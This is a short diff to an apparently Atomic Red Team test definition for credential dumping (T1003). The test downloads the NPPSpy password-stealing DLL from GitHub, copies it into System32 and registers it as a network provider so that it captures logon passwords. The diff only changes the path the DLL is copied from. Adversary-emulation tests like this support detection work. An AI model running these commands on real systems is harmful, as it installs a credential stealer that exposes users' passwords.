@@ -84,7 +84,7 @@ atomic_tests:
       Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\T1003\bin\NPPSpy.dll"
   executor:
     command: |-
-      Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
+      Copy-Item "PathToAtomicsFolder\T1003\bin\NPPSPY.dll" -Destination "C:\Windows\System32"
       $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
       $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
       Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
